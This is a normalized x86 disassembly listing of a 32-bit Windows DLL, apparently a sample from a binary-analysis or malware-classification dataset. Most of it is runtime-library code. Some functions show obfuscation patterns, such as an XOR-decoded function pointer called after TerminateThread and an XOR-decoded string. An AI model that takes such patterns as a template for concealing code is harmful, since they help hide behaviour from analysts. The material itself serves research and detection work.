lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_1001a495
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_10078c40
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_1001b334
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_10078c40
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_1002e9cf
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_10078600
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_10078600
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_1005d3a9
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
call sub_1000b659
sub_1005d7b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f88b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x18
call sub_1005ac7e
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x44 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x44 ]
call sub_100216c0
lea ecx [ ebp - 0x20 ]
push ecx
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10062021
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] eax
jmp r-xdata
sub_1005d889
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1005bf6b
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1005d8e0
push ebx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0xa8 ] 0x8
push edi
jb r-xdata
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] cx
cmp [ esi + 0x8c ] 0x8
jb r-xdata
mov eax [ esi + 0x94 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] ax
cmp [ esi + 0x70 ] 0x8
jb r-xdata
mov edx [ esi + 0x78 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] dx
cmp [ esi + 0x54 ] 0x8
jb r-xdata
mov ecx [ esi + 0x5c ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] edi
mov [ esi + 0x40 ] cx
cmp [ esi + 0x38 ] 0x8
jb r-xdata
mov eax [ esi + 0x40 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] edi
mov [ esi + 0x24 ] ax
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x24 ]
push edx
call sub_10065045
add esp 0x4
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] ebx
xor edx edx
pop edi
mov [ esi + 0x4 ] dx
pop esi
pop ebx
retn
mov ecx [ esi + 0x4 ]
push ecx
call sub_10065045
add esp 0x4
sub_1005d9c2
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10042f0f
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001905b
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10035b1e
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_1005da90
push ebp
mov ebp esp
mov edx 0x30c
mov ecx esi
xor eax eax
lea esp [ esp ]
test edx edx
jne r-xdata
add ecx 0x2
dec edx
jne r-xdata
mov ecx 0x30c
sub ecx edx
jmp r-xdata
mov eax 0x80070057
xor ecx ecx
cmp [ ecx ] ax
je r-xdata
jmp r-xdata
test eax eax
js r-xdata
pop ebp
retn 0x4
mov eax 0x30c
sub eax ecx
lea ecx [ esi + ecx * 2 ]
mov edx 0x7fffffff
pop ebp
jmp sub_1006b860
sub_1005daf0
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov eax [ ebx ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax esi
je r-xdata
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
test eax eax
je r-xdata
mov [ ebx ] 0x0
test esi esi
je r-xdata
push eax
call sub_10020a90
add esp 0x4
cmp [ esi ] 0x0
mov eax esi
je r-xdata
sub eax esi
push edi
lea edi [ eax + 0x1 ]
push edi
call sub_10056814
add esp 0x4
mov [ ebx ] eax
test eax eax
je r-xdata
mov edi edi
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
push edi
push esi
push eax
call sub_10078600
add esp 0xc
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_1005db57
push 0x34
mov eax sub_1007e6a6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x40 ] eax
mov al [ ebx ]
test al al
je r-xdata
xor esi esi
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x3c ] 0xfffffffe
mov [ ebp - 0x34 ] 0x1
mov cl al
mov edx ebx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
mov eax [ ebp - 0x3c ]
call sub_10019c00
retn
mov al [ edi + ebx ]
test al al
je r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
inc [ ebp + 0x10 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov cl [ ebx ]
cmp cl al
jne r-xdata
cmp [ eax + esi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
inc edi
mov al [ edi + ebx ]
test al al
jne r-xdata
add edi [ ebp - 0x34 ]
mov al [ edi + ebx ]
cmp al [ ebx ]
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp al cl
je r-xdata
push 0x7f
pop ecx
cmp [ ebp - 0x34 ] ecx
jae r-xdata
test al al
je r-xdata
movsx eax [ eax + esi ]
add edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x34 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_10060ea7
test al al
jne r-xdata
inc esi
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x3c ] esi
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x34 ]
cmp ecx 0x7f
jb r-xdata
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x7f
pop ecx
movzx eax [ ecx + 0x6 ]
movsx ecx [ edi + ebx ]
cmp ecx eax
jne r-xdata
call sub_1001e1bc
mov ecx [ ebp - 0x38 ]
push [ ebp - 0x40 ]
mov ecx [ ebp - 0x38 ]
call sub_10060ea7
test al al
jne r-xdata
mov [ eax + esi ] cl
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x2d ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
call sub_1001e1ec
or [ ebp - 0x3c ] 0xffffffff
jmp r-xdata
xor esi esi
xor edi edi
mov [ ebp - 0x2d ] 0x0
cmp [ ebp + 0x10 ] esi
jbe r-xdata
sub_1005dcc0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_1005dd20
push ebp
mov ebp esp
push esi
push edi
push 0x324
push 0x0
push ebx
call sub_10078970
mov esi [ ebp + 0xc ]
lea edi [ ebx + 0x122 ]
mov ecx 0x40
[ edi ] [ esi ]
mov edi [ ebp + 0x10 ]
mov eax edi
add esp 0xc
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov esi [ ebp + 0x8 ]
push eax
add esi 0x20
push edi
mov ecx esi
call sub_1005d090
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] eax
mov ax [ ebp + 0x14 ]
mov edi 0x1
mov [ ebx ] 0x7fffffff
mov [ ebx + 0x4 ] 0x7fffffff
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x20 ] ax
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push edi
push esi
lea edx [ ebx + 0x122 ]
call sub_1001d2c0
mov ecx [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
add esp 0x8
mov eax edi
pop edi
mov [ edx + 0x380 ] ecx
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
sub_1005ddc0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
push edi
mov edi 0x1
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x0
push eax
call [ TerminateThread@IAT ]
mov ecx [ esi + 0x4c ]
mov edi eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp - 0x4 ] al
xor [ ebp - 0x3 ] al
xor [ ebp - 0x2 ] al
xor [ ebp - 0x1 ] al
push ecx
call [ ebp - 0x4 ]
mov [ esi + 0x4c ] 0x0
sub_1005de14
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000ffad
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1005de35
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1003e989
pop ecx
pop ebp
retn
sub_1005de80
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd9
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x80 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x80 ]
call sub_10009820
mov esi eax
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi edi
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x11e
mov esi 0x1
call sub_1000a6f0
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x7c ]
push edx
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x7c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x11e
call sub_1000a6f0
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov esi [ ebx + 0x130 ]
cmp esi edi
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ ecx ]
mov edi [ esi ]
lea ecx [ ebp - 0x7c ]
push ecx
call sub_1004c9b0
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1005dfb0
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b974
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_1005e020
cmp eax edi
je r-xdata
retn
push ebx
push esi
lea esi [ eax + 0x18 ]
xor ebx ebx
jmp r-xdata
cmp [ esi ] 0x10
jb r-xdata
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
add esi 0x3c
lea ecx [ esi - 0x18 ]
cmp ecx edi
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_10065045
add esp 0x4
pop esi
pop ebx
sub_1005e05a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_10024496
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_1005e090
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_1005e0c0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x10 ]
jne r-xdata
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx [ eax ]
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x1
push edi
call sub_10031b70
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp ebx eax
jne r-xdata
mov ecx [ edi + 0xc ]
cmp ecx [ ebx + 0xc ]
jae r-xdata
mov eax [ edi + 0xc ]
cmp eax [ ebx + 0xc ]
jae r-xdata
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jae r-xdata
push 0x0
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_100278a0
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop ebx
pop edi
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edi
mov edi [ ebp + 0x8 ]
push ebx
push 0x1
push edi
mov ecx esi
call sub_10031b70
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ edi + 0xc ]
cmp [ ebx + 0xc ] eax
jae r-xdata
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
call sub_100363a0
mov eax [ ebp + 0x10 ]
mov ecx [ edi + 0xc ]
cmp [ eax + 0xc ] ecx
jae r-xdata
push edi
mov edi [ ebp + 0x8 ]
push eax
push 0x0
push edi
call sub_10031b70
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
lea ecx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
call sub_1002d110
mov eax [ ebp + 0x10 ]
cmp eax [ esi + 0x4 ]
je r-xdata
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov ecx esi
je r-xdata
mov edx [ ebx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov ecx esi
je r-xdata
mov ecx [ edi + 0xc ]
cmp ecx [ eax + 0xc ]
jae r-xdata
push ebx
push 0x1
push edi
call sub_10031b70
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x0
push edi
call sub_10031b70
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push eax
push 0x1
push edi
call sub_10031b70
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push ebx
push 0x0
push edi
call sub_10031b70
pop ebx
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_1005e213
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_1001c782
jmp r-xdata
sub_1005e2c0
push ebp
mov ebp esp
push 0xffffffff
push sub_100813a0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
test [ eax + edi + 0x14 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor esi esi
test [ eax + edi + 0xc ] 0x6
jne r-xdata
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
test esi esi
je r-xdata
mov eax [ eax + edi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_10007bc0
sub_1005e370
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_1000c130
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x14
sub_1005e3c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
cmp edi 0x7ffffffe
jbe r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100616c6
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_1000fb70
test edi edi
je r-xdata
cmp edx 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx eax
jbe r-xdata
mov eax esi
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax [ esi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
push ebx
lea ebx [ edi + edi ]
push ebx
push edx
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
sub eax ecx
push edx
sar eax 0x1
push eax
push esi
mov ecx esi
call sub_1001c310
pop edi
pop esi
pop ebp
retn 0x8
sub_1005e4e0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1005e510
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ecx + 0x10 ]
cmp eax esi
jae r-xdata
mov edx esi
cmp esi edi
jb r-xdata
mov esi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx edi
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp esi edi
jae r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test edx edx
je r-xdata
xor eax eax
cmp esi edi
setne al
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jne r-xdata
add eax 0x2
add ecx 0x2
dec edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
jmp r-xdata
sub_1005e57b
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_1005e59c
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_100111ac
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
push 0x3
call sub_1002fcb8
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_1002fcb8
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_10003d4a
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_10078ac0
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
